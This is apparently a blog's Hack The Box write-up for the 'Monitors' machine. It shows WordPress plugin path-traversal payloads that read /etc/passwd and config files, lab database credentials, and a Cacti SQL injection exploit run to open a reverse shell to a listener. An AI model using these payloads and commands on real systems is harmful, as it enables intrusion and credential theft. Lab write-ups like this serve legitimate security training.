<!doctype html><html lang="en"><head><title>Monitors | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Hard machine. This machine has a WordPress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization"><meta name="image" content="https://7rocky.github.io/images/HTB/Monitors/Monitors.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Hard machine. This machine has a WordPress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization"><meta itemprop="keywords" content="cve,docker,tomcat,wordpress,capabilities,port-forwarding,file-permissions,insecure-deserialization,directory-path-traversal,rce,"><meta itemprop="name" content="Monitors"><meta property="article:published_time" content="2021-10-09T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine has a WordPress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Monitors/Monitors.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Monitors"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/monitors/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Hard machine. This machine has a WordPress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization"><meta name="twitter:description" content="Hack The Box. Linux. Hard machine. This machine has a WordPress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Monitors/Monitors.webp"><meta name="twitter:title" content="Monitors"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/monitors/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/monitors/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/monitors/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/monitors/&amp;text=Monitors" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/monitors/&amp;title=Monitors" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Monitors</h1><time class="mt4 f6 dib tracked" datetime="2021-10-09T00:00:00+01:00">09 / 10 / 2021</time><br><p class="mb4 f6 dib tracked">13 minutes to read</p></header><div class="htb-image"><img alt="Monitors" src="/images/HTB/Monitors/Monitors.webp"><br><div class="htb-description bg-card">Hack The Box. Linux. Hard machine. This machine has a WordPress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization</div></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/tomcat" title="Tomcat">Tomcat</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/wordpress" title="WordPress">WordPress</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/capabilities" title="Capabilities">Capabilities</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/port-forwarding" title="Port forwarding">Port forwarding</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-permissions" title="File permissions">File permissions</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/insecure-deserialization" title="Insecure Deserialization">Insecure Deserialization</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/directory-path-traversal" title="Directory Path Traversal">Directory Path Traversal</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#exploiting-wordpress-spritz-plugin">Exploiting WordPress Spritz plugin</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-cacti">Exploiting Cacti</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a><ul><li><a href="#analyzing-the-docker-container">Analyzing the Docker container</a></li><li><a href="#exploiting-ofbiz">Exploiting OFBiz</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#escaping-from-the-docker-container">Escaping from the Docker container</a></li></ul></li><li><a href="#intended-way-to-own-usertxt">Intended way to own <code>user.txt</code></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Hard</li><li><strong>IP Address</strong>: 10.10.10.238</li><li><strong>Release</strong>: 24 / 04 / 2021</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.238 -p 22,80
Nmap scan report for 10.10.10.238
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 11.43 seconds
</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>Accessing directly to <code>http://10.10.10.238</code> results in an error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> http://10.10.10.238
Sorry, direct IP access is not allowed. &lt;br&gt;&lt;br&gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb  
</code></pre></div><p>We need to put <code>monitors.htb</code> into <code>/etc/hosts</code>. There is a WordPress site in port 80 (using virtual hosts, as IP requests are blocked):</p><p><img alt="Monitors 1" src="/images/HTB/Monitors/Monitors-1.webp"></p><p>To enumerate the WordPress site, we could have used <code>wpscan</code>. However, we can list plugins going to <code>/wp-content/plugins</code>, because there is a directory listing vulnerability:</p><p><img alt="Monitors 2" src="/images/HTB/Monitors/Monitors-2.webp"></p><p>We can search if there is a vulnerability involving the <code>wp-with-spritz</code> plugin. This plugin has Directory Path Traversal and Remote File Inclusion (RFI) vulnerabilities:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">searchsploit</span> spritz
------------------------------------------------------------ -----------------------
Exploit Title                                               | Path
------------------------------------------------------------ -----------------------
WordPress Plugin WP with <span class="code-red">Spritz</span> 1.0 - Remote File Inclusion | php/webapps/44544.php
------------------------------------------------------------ -----------------------
Shellcodes: No Results

<span class="code-cyan">$</span> <span class="code-dark-green">searchsploit</span> -x 44544

# Exploit Title: WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion
# Date: 2018-04-25
# Exploit Author: Wadeek
# Software Link: https://downloads.wordpress.org/plugin/wp-with-spritz.zip
# Software Version: 1.0
# Google Dork: intitle:("Spritz Login Success") AND inurl:("wp-with-spritz/wp.spritz.login.success.html")  
# Tested on: Apache2 with PHP 7 on Linux
# Category: webapps


1. Version Disclosure

/wp-content/plugins/wp-with-spritz/readme.txt

2. Source Code

if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);

3. Proof of Concept

/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
</code></pre></div><h3 id="exploiting-wordpress-spritz-plugin">Exploiting WordPress Spritz plugin</h3><p>Now, we are able to read files from the server exploiting Directory Path Traversal. For example, <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd'</span>  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
</code></pre></div><p>We can try to read the WordPress configuration and search for credentials to the machine or to a database. There is a database password in <code>wp-config.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php'</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
<span class="mtk3">/**</span>
<span class="mtk10">...</span>
<span class="mtk3"> */</span>

<span class="mtk3">// ** MySQL settings - You can get this info from </span><span class="mtk3">your web host ** //</span>  
<span class="mtk3">/** The name of the database for WordPress */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_NAME'</span><span class="mtk1">, </span><span class="mtk4">'wordpress'</span><span class="mtk1"> );</span>

<span class="mtk3">/** MySQL database username */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_USER'</span><span class="mtk1">, </span><span class="mtk4">'wpadmin'</span><span class="mtk1"> );</span>

<span class="mtk3">/** MySQL database password */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_PASSWORD'</span><span class="mtk1">, </span><span class="mtk4">'BestAdministrator@2020!'</span><span class="mtk1"> );</span>

<span class="mtk3">/** MySQL hostname */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_HOST'</span><span class="mtk1">, </span><span class="mtk4">'localhost'</span><span class="mtk1"> );</span>

<span class="mtk3">/** Database Charset to use in creating database t</span><span class="mtk3">ables. */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_CHARSET'</span><span class="mtk1">, </span><span class="mtk4">'utf8mb4'</span><span class="mtk1"> );</span>

<span class="mtk3">/** The Database Collate type. Don't change this i</span><span class="mtk3">f in doubt. */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_COLLATE'</span><span class="mtk1">, </span><span class="mtk4">''</span><span class="mtk1"> );</span>

<span class="mtk3">// ...</span>

<span class="mtk5">require_once</span><span class="mtk1"> </span><span class="mtk6">ABSPATH</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> </span><span class="mtk4">'wp-settings.php'</span><span class="mtk1">;</span>
</code></pre></div><p>However, that password is not reused for SSH. Notice that PHP files are not interpreted, so the server is not vulnerable to Log Poisoning.</p><p>So, we can try to read the Apache configuration and look for the virtual host settings, searching for <code>/etc/apache2/sites-enabled/000-default.conf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/apache2/sites-enabled/000-default.conf'</span>
# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf

&lt;VirtualHost *:80&gt;
	# ...
	#ServerName www.example.com

	ServerAdmin admin@monitors.htb
	DocumentRoot /var/www/html
	Redirect 403 /
	ErrorDocument 403 "Sorry, direct IP access is not allowed. &lt;br&gt;&lt;br&gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb"  
	UseCanonicalName Off
	# ...
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# ...
	#Include conf-available/serve-cgi-bin.conf
&lt;/VirtualHost&gt;

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
</code></pre></div><h2 id="foothold">Foothold</h2><p>There is indeed another subdomain called <code>cacti-admin.monitors.htb</code>:</p><p><img alt="Monitors 3" src="/images/HTB/Monitors/Monitors-3.webp"></p><p>This is an administrator panel protected with username and password. Using <code>admin:BestAdministrator@2020!</code>, previously found, the access to the panel is granted:</p><p><img alt="Monitors 4" src="/images/HTB/Monitors/Monitors-4.webp"></p><h3 id="exploiting-cacti">Exploiting Cacti</h3><p>The website is using Cacti Version 1.2.12, which is vulnerable to SQL injection:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">searchsploit</span> cacti 1.2.12
-------------------------------------- ----------------------  
Exploit Title                         | Path
-------------------------------------- ----------------------
<span class="code-red">Cacti</span> <span class="code-red">1.2.12</span> - 'filter' SQL Injection | php/webapps/49810.py
-------------------------------------- ----------------------
Shellcodes: No Results
</code></pre></div><p>We can use this exploit to gain access to the machine as user <code>www-data</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">49810.py</span> -t http://cacti-admin.monitors.htb -u admin -p <span class="code-dark-yellow">'BestAdministrator@2020!'</span> --lhost 10.10.17.44 --lport 4444  
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:f2c540bd85e4ecc461d050a1ee3de4060dc6ddc0,1669676332
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
"name","hex"
"",""
"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
"guest","43e9a4ab75570f5b"

[+] Check your nc listener!
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:40124.
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@monitors:/usr/share/cacti/cacti$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
